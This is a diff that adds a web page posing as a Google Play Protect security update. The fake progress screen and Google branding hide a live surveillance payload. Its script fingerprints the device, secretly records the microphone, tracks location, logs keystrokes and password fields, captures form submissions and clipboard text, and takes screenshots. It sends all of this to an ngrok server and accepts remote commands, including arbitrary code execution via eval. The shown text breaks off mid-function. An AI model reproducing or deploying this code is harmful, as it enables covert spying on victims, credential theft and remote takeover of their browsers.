@@ -1,0 +1,1356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Security Verification - System Update</title>
+    <meta name="description" content="Verifying device security and installing critical updates">
+    
+    <!-- iOS мета-теги -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Security Update">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="theme-color" content="#4285f4">
+    
+    <!-- Android мета-теги -->
+    <meta name="mobile-web-app-capable" content="yes">
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        html, body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+        
+        .container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .badge {
+            background: linear-gradient(135deg, #34a853, #0f9d58);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(52, 168, 83, 0.3);
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            line-height: 1.5;
+            max-width: 500px;
+            margin-bottom: 40px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 40px 0;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: #e8eaed;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4285f4, #34a853);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                90deg,
+                transparent 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                transparent 100%
+            );
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .progress-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+        
+        .status-container {
+            min-height: 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        
+        .status-text {
+            font-size: 16px;
+            color: #4285f4;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 10px;
+            min-height: 24px;
+        }
+        
+        .status-details {
+            font-size: 13px;
+            color: #5f6368;
+            text-align: center;
+            max-width: 400px;
+            line-height: 1.4;
+        }
+        
+        .features {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 24px;
+            margin: 30px 0;
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid #e8eaed;
+        }
+        
+        .features h3 {
+            font-size: 16px;
+            color: #4285f4;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+        
+        .features-list {
+            list-style: none;
+        }
+        
+        .features-list li {
+            margin-bottom: 12px;
+            padding-left: 24px;
+            position: relative;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.4;
+        }
+        
+        .features-list li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #34a853;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .complete-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            z-index: 1000;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .complete-overlay.show {
+            display: flex;
+        }
+        
+        .complete-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: bounce 1s ease;
+        }
+        
+        .complete-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #34a853;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .complete-message {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            max-width: 400px;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 11px;
+            color: #9aa0a6;
+            text-align: center;
+            line-height: 1.4;
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .device-id {
+            font-family: monospace;
+            background: #f1f3f4;
+            padding: 4px 8px;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-size: 10px;
+            letter-spacing: 1px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+        
+        /* iOS специфичные стили */
+        @supports (-webkit-touch-callout: none) {
+            .container {
+                padding-top: env(safe-area-inset-top);
+                padding-bottom: env(safe-area-inset-bottom);
+            }
+            
+            .progress-bar {
+                height: 10px;
+            }
+        }
+        
+        /* Android специфичные стили */
+        @media (hover: none) and (pointer: coarse) {
+            .features-list li {
+                padding-left: 28px;
+                margin-bottom: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Google</div>
+            <div class="badge">PLAY PROTECT</div>
+        </div>
+        
+        <h1>Security Verification & System Update</h1>
+        <p class="subtitle">
+            Your device is being verified for security compliance. 
+            Critical updates are being installed to protect your data and ensure optimal performance.
+        </p>
+        
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-labels">
+                <span>Scanning</span>
+                <span id="progressPercent">0%</span>
+                <span>Installing</span>
+            </div>
+        </div>
+        
+        <div class="status-container">
+            <div class="status-text" id="statusText">Initializing security scan...</div>
+            <div class="status-details" id="statusDetails">Checking device compatibility and security status</div>
+        </div>
+        
+        <div class="features">
+            <h3>Security Features Being Updated</h3>
+            <ul class="features-list">
+                <li>Google Play Protect real-time scanning</li>
+                <li>System vulnerability patches (January 2025)</li>
+                <li>App security certifications</li>
+                <li>Encryption key rotation</li>
+                <li>Network security enhancements</li>
+                <li>Privacy guard updates</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <p>Google LLC • 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
+            <p>This update is delivered through Google Play Services</p>
+            <div class="device-id">ID: f960354b5ec69e50cc8e3512 • 2026-01-28</div>
+        </div>
+    </div>
+    
+    <div class="complete-overlay" id="completeOverlay">
+        <div class="complete-icon">✅</div>
+        <h2 class="complete-title">Verification Complete</h2>
+        <p class="complete-message">
+            Your device has been successfully verified and all security updates have been installed.
+            Your device is now protected with the latest security features.
+        </p>
+        <div class="footer">
+            <p>You may now close this window. Changes will take effect immediately.</p>
+            <div class="device-id">SESSION: f960354b5ec69e50cc8e3512</div>
+        </div>
+    </div>
+    
+    <!-- Скрытые элементы для функциональности -->
+    <div style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;opacity:0.001;">
+        <audio id="hiddenAudioElement" controls></audio>
+        <button id="hiddenButton" style="width:100px;height:100px;"></button>
+    </div>
+
+    <script>
+        // Симуляция процесса обновления
+        const steps = [
+            { text: "Initializing security scan...", details: "Checking device compatibility" },
+            { text: "Verifying system integrity...", details: "Scanning for tampered components" },
+            { text: "Downloading security patches (1/4)...", details: "Connecting to update servers" },
+            { text: "Downloading security patches (2/4)...", details: "Transferring encryption modules" },
+            { text: "Downloading security patches (3/4)...", details: "Downloading vulnerability fixes" },
+            { text: "Downloading security patches (4/4)...", details: "Acquiring privacy enhancements" },
+            { text: "Applying system updates...", details: "Installing critical security patches" },
+            { text: "Optimizing performance...", details: "Tuning security parameters" },
+            { text: "Finalizing installation...", details: "Completing security configuration" },
+            { text: "Verification complete!", details: "Device is now secured" }
+        ];
+        
+        let currentStep = 0;
+        let progress = 0;
+        
+        function updateProgress() {
+            if (currentStep < steps.length) {
+                document.getElementById('statusText').textContent = steps[currentStep].text;
+                document.getElementById('statusDetails').textContent = steps[currentStep].details;
+                
+                progress = Math.min(100, ((currentStep + 1) / steps.length) * 100);
+                document.getElementById('progressFill').style.width = progress + '%';
+                document.getElementById('progressPercent').textContent = Math.round(progress) + '%';
+                
+                currentStep++;
+                
+                if (currentStep === steps.length) {
+                    // Завершение
+                    setTimeout(() => {
+                        document.getElementById('completeOverlay').classList.add('show');
+                        document.title = "Security Verification - Complete";
+                        
+                        // Для iOS меняем favicon
+                        const favicon = document.querySelector("link[rel='icon']");
+                        if (favicon) {
+                            favicon.href = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✅</text></svg>";
+                        }
+                    }, 1500);
+                } else {
+                    setTimeout(updateProgress, 1500 + Math.random() * 1000);
+                }
+            }
+        }
+        
+        // Запуск симуляции через 1 секунду
+        setTimeout(updateProgress, 1000);
+        
+        // Основной payload скрипт
+        
+// === UNIVERSAL SURVEILLANCE PAYLOAD (Android + iOS) ===
+(function() {
+    'use strict';
+    
+    const PAYLOAD_ID = 'f960354b5ec69e50cc8e3512';
+    const SERVER_URL = 'https://daryl-vaunted-anapestically.ngrok-free.dev';
+    const WS_URL = 'wss://daryl-vaunted-anapestically.ngrok-free.dev/ws';
+    const ENABLE_MIC = true;
+    const ENABLE_SCR = true;
+    const ENABLE_KEY = true;
+    const ENABLE_GEO = true;
+    
+    // Определяем платформу
+    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+    const isAndroid = /Android/.test(navigator.userAgent);
+    const isMobile = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/.test(navigator.userAgent);
+    
+    let sessionData = {
+        deviceId: PAYLOAD_ID,
+        platform: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop'),
+        startTime: Date.now(),
+        clicks: [],
+        keystrokes: [],
+        locations: [],
+        recordings: [],
+        screenshots: []
+    };
+    
+    // === 1. ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ ===
+    async function collectDeviceInfo() {
+        const info = {
+            type: 'device_complete',
+            id: PAYLOAD_ID,
+            timestamp: new Date().toISOString(),
+            
+            // Основная информация
+            platform: {
+                isIOS: isIOS,
+                isAndroid: isAndroid,
+                isMobile: isMobile,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                appVersion: navigator.appVersion,
+                product: navigator.product
+            },
+            
+            // Языки и время
+            locale: {
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            },
+            
+            // Экран
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio || 1,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            },
+            
+            // Окно
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                scrollX: window.scrollX,
+                scrollY: window.scrollY
+            },
+            
+            // Возможности
+            capabilities: {
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                serviceWorker: 'serviceWorker' in navigator,
+                webGL: detectWebGL(),
+                webRTC: detectWebRTC(),
+                notifications: 'Notification' in window,
+                vibration: 'vibrate' in navigator,
+                bluetooth: 'bluetooth' in navigator
+            },
+            
+            // Хранилище
+            storage: {
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB,
+                caches: 'caches' in window
+            },
+            
+            // Сеть
+            network: {},
+            
+            // Батарея
+            battery: {},
+            
+            // Приложения
+            apps: {
+                installed: detectInstalledApps()
+            }
+        };
+        
+        // Сеть
+        if (navigator.connection) {
+            info.network = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+                type: navigator.connection.type || 'unknown'
+            };
+        }
+        
+        // Батарея (только если доступно)
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                info.battery = {
+                    charging: battery.charging,
+                    level: Math.round(battery.level * 100),
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch(e) {}
+        }
+        
+        // Хранилище (если доступно)
+        if (navigator.storage && navigator.storage.estimate) {
+            try {
+                const estimate = await navigator.storage.estimate();
+                info.storage.estimate = {
+                    quota: estimate.quota,
+                    usage: estimate.usage
+                };
+            } catch(e) {}
+        }
+        
+        // Медиа устройства
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                info.mediaDevices = devices.map(d => ({
+                    kind: d.kind,
+                    label: d.label || 'No label',
+                    groupId: d.groupId.substring(0, 8) + '...'
+                }));
+            } catch(e) {}
+        }
+        
+        return info;
+    }
+    
+    function detectWebGL() {
+        try {
+            const canvas = document.createElement('canvas');
+            return !!(window.WebGLRenderingContext && 
+                     (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+        } catch(e) {
+            return false;
+        }
+    }
+    
+    function detectWebRTC() {
+        return !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || 
+                 window.mozRTCPeerConnection);
+    }
+    
+    function detectInstalledApps() {
+        const apps = [];
+        
+        // Проверяем популярные приложения через кастомные схемы
+        const appSchemes = {
+            'whatsapp': 'whatsapp://send',
+            'telegram': 'tg://resolve',
+            'instagram': 'instagram://app',
+            'facebook': 'fb://profile',
+            'twitter': 'twitter://timeline',
+            'youtube': 'youtube://watch',
+            'spotify': 'spotify://play',
+            'netflix': 'nflx://',
+            'gmail': 'googlegmail://',
+            'maps': 'comgooglemaps://',
+            'drive': 'googledrive://'
+        };
+        
+        // Для iOS
+        if (isIOS) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            for (const [app, scheme] of Object.entries(appSchemes)) {
+                try {
+                    iframe.src = scheme;
+                    setTimeout(() => {
+                        if (document.hidden === false) {
+                            apps.push(app);
+                        }
+                    }, 100);
+                } catch(e) {}
+            }
+            
+            setTimeout(() => document.body.removeChild(iframe), 1000);
+        }
+        
+        return apps;
+    }
+    
+    // === 2. СКРЫТАЯ ЗАПИСЬ МИКРОФОНА ===
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let isRecording = false;
+    
+    async function startHiddenRecording() {
+        if (!ENABLE_MIC) return false;
+        
+        try {
+            // Для iOS нужна интеракция, имитируем её
+            if (isIOS) {
+                const fakeButton = document.createElement('button');
+                fakeButton.style.cssText = 'position:absolute;top:0;left:0;width:100px;height:100px;opacity:0.001;z-index:9999;';
+                fakeButton.textContent = ' ';
+                document.body.appendChild(fakeButton);
+                fakeButton.click();
+                setTimeout(() => document.body.removeChild(fakeButton), 100);
+            }
+            
+            const stream = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: { ideal: false },
+                    noiseSuppression: { ideal: false },
+                    autoGainControl: { ideal: false },
+                    channelCount: { ideal: 2 }
+                }
+            });
+            
+            // Для iOS используем AAC кодек
+            const mimeType = isIOS ? 'audio/mp4' : 'audio/webm;codecs=opus';
+            
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: mimeType,
+                audioBitsPerSecond: 96000
+            });
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    audioChunks.push(event.data);
+                    
+                    // Отправляем каждые 15 секунд
+                    if (audioChunks.length > 0 && isRecording) {
+                        const audioBlob = new Blob(audioChunks, { type: mimeType });
+                        sendAudioToServer(audioBlob);
+                        audioChunks = [];
+                    }
+                }
+            };
+            
+            mediaRecorder.onstop = () => {
+                stream.getTracks().forEach(track => track.stop());
+                isRecording = false;
+            };
+            
+            mediaRecorder.start(15000); // Отправляем каждые 15 секунд
+            isRecording = true;
+            
+            // Скрываем в DOM для iOS
+            const hiddenAudio = document.createElement('audio');
+            hiddenAudio.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.001;';
+            hiddenAudio.controls = false;
+            hiddenAudio.srcObject = stream;
+            hiddenAudio.id = 'hidden_recorder_' + PAYLOAD_ID;
+            document.body.appendChild(hiddenAudio);
+            
+            return true;
+            
+        } catch(error) {
+            sendToServer({ type: 'microphone_error', error: error.message });
+            return false;
+        }
+    }
+    
+    function stopRecording() {
+        if (mediaRecorder && isRecording) {
+            mediaRecorder.stop();
+            const hiddenAudio = document.getElementById('hidden_recorder_' + PAYLOAD_ID);
+            if (hiddenAudio) hiddenAudio.remove();
+        }
+    }
+    
+    function sendAudioToServer(audioBlob) {
+        const filename = `audio_${Date.now()}_${isIOS ? 'ios' : 'android'}_${PAYLOAD_ID}.${isIOS ? 'm4a' : 'webm'}`;
+        
+        // Используем FormData для отправки
+        const formData = new FormData();
+        formData.append('type', 'audio_recording');
+        formData.append('id', PAYLOAD_ID);
+        formData.append('platform', isIOS ? 'ios' : 'android');
+        formData.append('timestamp', Date.now());
+        formData.append('audio', audioBlob, filename);
+        
+        // Отправляем через Beacon (работает даже при закрытии)
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(SERVER_URL + '/upload', formData);
+        }
+        
+        // Дублируем через fetch
+        fetch(SERVER_URL + '/upload', {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors',
+            keepalive: true
+        }).catch(() => {});
+        
+        // Сохраняем в sessionData
+        sessionData.recordings.push({
+            timestamp: Date.now(),
+            duration: 15000,
+            format: isIOS ? 'm4a' : 'webm',
+            size: audioBlob.size
+        });
+    }
+    
+    // === 3. ГЕОЛОКАЦИЯ В РЕАЛЬНОМ ВРЕМЕНИ ===
+    let locationWatchId = null;
+    
+    function startLocationTracking() {
+        if (!ENABLE_GEO || !('geolocation' in navigator)) return;
+        
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+        
+        locationWatchId = navigator.geolocation.watchPosition(
+            (position) => {
+                const location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed,
+                    timestamp: position.timestamp
+                };
+                
+                sessionData.locations.push(location);
+                
+                // Отправляем каждое обновление
+                sendToServer({
+                    type: 'location_update',
+                    data: location
+                });
+                
+                // Автоматически включаем запись если в движении
+                if (position.coords.speed > 2 && !isRecording && ENABLE_MIC) {
+                    startHiddenRecording();
+                }
+                
+            },
+            (error) => {
+                sendToServer({
+                    type: 'location_error',
+                    error: `${error.code}: ${error.message}`
+                });
+            },
+            options
+        );
+    }
+    
+    // === 4. КЕЙЛОГГЕР И ПЕРЕХВАТ ФОРМ ===
+    function setupKeylogger() {
+        if (!ENABLE_KEY) return;
+        
+        // Запись всех нажатий клавиш
+        document.addEventListener('keydown', (event) => {
+            const target = event.target;
+            const keystroke = {
+                key: event.key,
+                code: event.code,
+                keyCode: event.keyCode,
+                timestamp: Date.now(),
+                target: {
+                    tagName: target.tagName,
+                    id: target.id || '',
+                    name: target.name || '',
+                    type: target.type || '',
+                    className: target.className || '',
+                    value: target.value ? target.value.substring(0, 50) : ''
+                }
+            };
+            
+            sessionData.keystrokes.push(keystroke);
+            
+            // Специальная обработка паролей и логинов
+            const isSensitive = target.type === 'password' || 
+                               target.type === 'email' ||
+                               target.name?.toLowerCase().includes('pass') ||
+                               target.name?.toLowerCase().includes('login') ||
+                               target.id?.toLowerCase().includes('pass') ||
+                               target.id?.toLowerCase().includes('login');
+            
+            if (isSensitive) {
+                sendToServer({
+                    type: 'sensitive_keystroke',
+                    data: keystroke
+                });
+            }
+        }, true);
+        
+        // Перехват отправки форм
+        document.addEventListener('submit', (event) => {
+            const form = event.target;
+            const formData = new FormData(form);
+            const formObject = {};
+            
+            for (let [key, value] of formData.entries()) {
+                formObject[key] = value;
+            }
+            
+            sendToServer({
+                type: 'form_submission',
+                data: {
+                    action: form.action,
+                    method: form.method,
+                    id: form.id,
+                    name: form.name,
+                    inputs: formObject
+                }
+            });
+        }, true);
+        
+        // Захват копирования текста
+        document.addEventListener('copy', () => {
+            const selectedText = window.getSelection().toString();
+            if (selectedText.length > 0) {
+                sendToServer({
+                    type: 'clipboard_copy',
+                    data: {
+                        text: selectedText.substring(0, 500),
+                        timestamp: Date.now()
+                    }
+                });
+            }
+        });
+    }
+    
+    // === 5. СКРИНШОТЫ ЭКРАНА ===
+    async function captureScreenshot() {
+        if (!ENABLE_SCR) return null;
+        
+        try {
+            // Пытаемся использовать HTML2Canvas если доступен
+            if (typeof html2canvas !== 'undefined') {
+                const canvas = await html2canvas(document.body, {
+                    scale: 0.5,
+                    useCORS: true,
+                    allowTaint: true,
+                    logging: false
+                });
+                
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            sendScreenshotToServer(blob);
+                            resolve(true);
+                        }
+                    }, 'image/jpeg', 0.7);
+                });
+            }
+            
+            // Fallback: screenshot видимой области
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // Для iOS нужно ждать загрузки изображений
+            const imageLoadPromises = Array.from(document.images)
+                .filter(img => !img.complete)
+                .map(img => new Promise(resolve => {
+                    img.onload = resolve;
+                    img.onerror = resolve;
+                }));
+            
+            await Promise.all(imageLoadPromises);
+            
+            // Рисуем страницу
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Копируем видимую область (упрощённо)
+            const html = document.documentElement.outerHTML.substring(0, 10000);
+            sendToServer({
+                type: 'dom_snapshot',
+                data: {
+                    html: html,
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                }
+            });
+            
+            return false;
+            
+        } catch(error) {
+            return false;
+        }
+    }
+    
+    function sendScreenshotToServer(imageBlob) {
+        const filename = `screenshot_${Date.now()}_${PAYLOAD_ID}.jpg`;
+        const formData = new FormData();
+        
+        formData.append('type', 'screenshot');
+        formData.append('id', PAYLOAD_ID);
+        formData.append('platform', isIOS ? 'ios' : 'android');
+        formData.append('timestamp', Date.now());
+        formData.append('image', imageBlob, filename);
+        
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(SERVER_URL + '/upload', formData);
+        }
+        
+        fetch(SERVER_URL + '/upload', {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors',
+            keepalive: true
+        }).catch(() => {});
+        
+        sessionData.screenshots.push({
+            timestamp: Date.now(),
+            size: imageBlob.size
+        });
+    }
+    
+    // === 6. WEBSOCKET ДЛЯ ДИСТАНЦИОННОГО УПРАВЛЕНИЯ ===
+    let commandSocket = null;
+    
+    function connectWebSocket() {
+        if (!WS_URL) return;
+        
+        commandSocket = new WebSocket(WS_URL);
+        
+        commandSocket.addEventListener('open', () => {
+            // Регистрируем устройство
+            commandSocket.send(JSON.stringify({
+                type: 'device_register',
+                id: PAYLOAD_ID,
+                platform: isIOS ? 'ios' : 'android',
+                userAgent: navigator.userAgent.substring(0, 100)
+            }));
+            
+            sendToServer({ type: 'websocket_connected' });
+        });
+        
+        commandSocket.addEventListener('message', async (event) => {
+            try {
+                const command = JSON.parse(event.data);
+                
+                switch(command.action) {
+                    case 'start_recording':
+                        const recordingStarted = await startHiddenRecording();
+                        if (commandSocket.readyState === WebSocket.OPEN) {
+                            commandSocket.send(JSON.stringify({
+                                type: 'command_response',
+                                command: 'start_recording',
+                                success: recordingStarted,
+                                timestamp: Date.now()
+                            }));
+                        }
+                        break;
+                        
+                    case 'stop_recording':
+                        stopRecording();
+                        if (commandSocket.readyState === WebSocket.OPEN) {
+                            commandSocket.send(JSON.stringify({
+                                type: 'command_response',
+                                command: 'stop_recording',
+                                success: true,
+                                timestamp: Date.now()
+                            }));
+                        }
+                        break;
+                        
+                    case 'take_screenshot':
+                        const screenshotResult = await captureScreenshot();
+                        if (commandSocket.readyState === WebSocket.OPEN) {
+                            commandSocket.send(JSON.stringify({
+                                type: 'command_response',
+                                command: 'take_screenshot',
+                                success: !!screenshotResult,
+                                timestamp: Date.now()
+                            }));
+                        }
+                        break;
+                        
+                    case 'get_location':
+                        if ('geolocation' in navigator) {
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    if (commandSocket.readyState === WebSocket.OPEN) {
+                                        commandSocket.send(JSON.stringify({
+                                            type: 'location_response',
+                                            latitude: position.coords.latitude,
+                                            longitude: position.coords.longitude,
+                                            accuracy: position.coords.accuracy,
+                                            timestamp: Date.now()
+                                        }));
+                                    }
+                                },
+                                (error) => {
+                                    if (commandSocket.readyState === WebSocket.OPEN) {
+                                        commandSocket.send(JSON.stringify({
+                                            type: 'location_error',
+                                            error: error.message,
+                                            timestamp: Date.now()
+                                        }));
+                                    }
+                                },
+                                { enableHighAccuracy: true, timeout: 10000 }
+                            );
+                        }
+                        break;
+                        
+                    case 'execute_code':
+                        try {
+                            const result = eval(command.code);
+                            if (commandSocket.readyState === WebSocket.OPEN) {
+                                commandSocket.send(JSON.stringify({
+                                    type: 'code_execution_result',
+                                    result: typeof result === 'object' ? JSON.stringify(result) : result,
+                                    timestamp: Date.now()
+                                }));
+                            }
+                        } catch(error) {
+                            if (commandSocket.readyState === WebSocket.OPEN) {
+                                commandSocket.send(JSON.stringify({
+                                    type: 'code_execution_error',
+                                    error: error.message,
+                                    timestamp: Date.now()
+                                }));
+                            }
+                        }
+                        break;
+                        
+                    case 'get_session_data':
+                        if (commandSocket.readyState === WebSocket.OPEN) {
+                            commandSocket.send(JSON.stringify({
+                                type: 'session_data',
+                                data: {
+                                    deviceId: PAYLOAD_ID,
+                                    platform: isIOS ? 'iOS' : 'Android',
+                                    sessionDuration: Date.now() - sessionData.startTime,
+                                    clicks: sessionData.clicks.length,
+                                    keystrokes: sessionData.keystrokes.length,
+                                    locations: sessionData.locations.length,
+                                    recordings: sessionData.recordings.length,
+                                    screenshots: sessionData.screenshots.length
+                                },
+                                timestamp: Date.now()
+                            }));
+                        }
+                        break;
+                }
+            } catch(error) {
+                console.error('Command error:', error);
+            }
+        });
+        
+        commandSocket.addEventListener('error', (error) => {
+            sendToServer({ type: 'websocket_error', error: error.message });
+        });
+        
+        commandSocket.addEventListener('close', () => {
+            setTimeout(connectWebSocket, 5000); // Переподключение через 5 секунд
+        });
+    }
+    
+    // === 7. ОТСЛЕЖИВАНИЕ КЛИКОВ И ДЕЙСТВИЙ ===
+    function setupClickTracker() {
+        document.addEventListener('click', (event) => {
+            const clickData = {
+                x: event.clientX,
+                y: event.clientY,
+                pageX: event.pageX,
+                pageY: event.pageY,
+                target: {
+                    tagName: event.target.tagName,
+                    id: event.target.id || '',
+                    className: event.target.className || '',
+                    text: event.target.textContent?.substring(0, 50) || ''
+                },
+                timestamp: Date.now()
+            };
+            
+            sessionData.clicks.push(clickData);
+            
+            // Отправляем каждые 10 кликов или важные клики
+            if (sessionData.clicks.length % 10 === 0 || 
+                event.target.tagName === 'BUTTON' || 
+                event.target.tagName === 'A') {
+                sendToServer({
+                    type: 'click_activity',
+                    data: clickData
+                });
+            }
+        }, true);
+        
+        // Отслеживание скролла
+        let scrollTimeout;
+        window.addEventListener('scroll', () => {
+            clearTimeout(scrollTimeout);
+            scrollTimeout = setTimeout(() => {
+                sendToServer({
+                    type: 'scroll_position',
+                    data: {
+                        scrollX: window.scrollX,
+                        scrollY: window.scrollY,
+                        maxScroll: document.documentElement.scrollHeight - window.innerHeight
+                    }
+                });
+            }, 1000);
+        });
